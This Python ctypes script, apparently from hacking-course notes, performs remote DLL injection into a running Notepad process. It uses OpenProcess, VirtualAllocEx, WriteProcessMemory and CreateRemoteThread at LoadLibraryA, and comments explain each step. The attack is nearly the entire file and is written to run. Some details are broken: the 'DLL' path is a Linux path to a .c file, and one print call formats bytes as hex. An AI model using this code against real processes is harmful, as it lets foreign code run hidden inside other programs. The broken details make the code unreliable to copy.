""" 
Three Steps to DLL Injection:
1) Allocate memory within a REMOTE process
2) Write DLL location into allocated memory
3) Have external process load DLL via load library
"""

from ctypes import *
from ctypes import wintypes

kernel32 = windll.kernel32
LPCSTR = c_char_p
SIZE_T = c_size_t

"""
Will use the following API's:
OpenProcess
VirtualAllocEx - specify ANOTHER process in which to create memory
WriteProcessMemory
GetModuleHandle
GetProcAddress
CreateRemoteThread
"""

OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)
OpenProcess.restype = wintypes.HANDLE

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.DWORD)
VirtualAllocEx.restype = wintypes.LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T, POINTER(SIZE_T))
WriteProcessMemory.restype = wintypes.BOOL

GetModuleHandle = kernel32.GetModuleHandle
GetModuleHandle.argtypes = (LPCSTR, )
GetModuleHandle.restype = wintypes.HANDLE

GetProcAddress = kernel32.GetProcAddress
GetProcAddress.argtypes = (wintypes.HANDLE, LPCSTR)
GetProcAddress.restype = wintypes.LPVOID

class _SECURITY_ATTRIBUTES(Structure):
  _fields_ = [("nLength", wintypes.DWORD), 
              ("IpSecurityDescriptor", wintypes.LPVOID), 
              ("bInheritHandle", wintypes.BOOL)]

SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = wintypes.LPVOID

#LP Security Attribute is a Pointer to a Security Attribute structure
#LPThreadStartRoutine used as pointer to the application-defined function set to be executed by the thread

CreateRemoteThread = kernel32.CreateRemoteThread 
CreateRemoteThread.argtypes = (wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD) 
CreateRemoteThread.restype = wintypes.HANDLE

#constants to work with memory
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
EXECUTE_IMMEDIATELY = 0x0
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF)

dll = b"/home/theseus/Applications/VSCodium/Python\ for\ Hackers/201/hello_world.c"

#can start process or inject into existing
#class example uses a running windows Notepad process

#locate Notepad pid via task mgr
pid = 2160

#Open the Notepad process & allocate memory
handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid) #find argument details on MSFT docs
if not handle:
  raise WinError()

print("Handle Obtained: {0:X}".format(handle))

remote_memory = VirtualAllocEx(handle, False, len(dll) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
if not remote_memory:
  raise WinError()

print("Memory Allocated: {0:X}".format(remote_memory))

#write DLL Location into remote process's memory, via allocated memory section
write = WriteProcessMemory(handle, remote_memory, dll, len(dll) + 1, None)
if not write:
  raise WinError()

print("Bytes Written: {0:X}".format(dll))

#start new thread to load DLL
#find location of LoadLibraryA, via GetProcAddress and GetModuleHandle

#GetProcAddress retrieves address of exported variable or function from the specified DLL

load_lib = GetProcAddress(GetModuleHandle(b"kernel32.dll"), b"LoadLibraryA")
print(f"Load Library Address: {hex(load_lib)}")

#start remote thread
#create a thread that runs in the Virtual Address space of another process
rthread = CreateRemoteThread(handle, None, 0, load_lib, remote_memory, EXECUTE_IMMEDIATELY, None) #third argument refers to the start address, which is the routine to be executed by the thread
#fourth argument specifies the variable to be passed to the thread function
#in this eample, LoadLibraryA loads the specified module into the address space of the calling process

#when running this, a hello world message will appear entirely within the process address space of Notepad
#IRL: use VirtualFreeEx & CloseHandle to cleanup

#when testing: LoadLibraryA can only load the DLL into the remote process ONCE
#USE A DIFFERENT PID EACH TIME

""" 
From LoadLibraryA's 'Remarks' section:
if the specified module is a DLL that is not already loaded for the calling process,
the system calls the DLL's 'dll_main' function with the DLL_PROCESS_ATTACH value
"""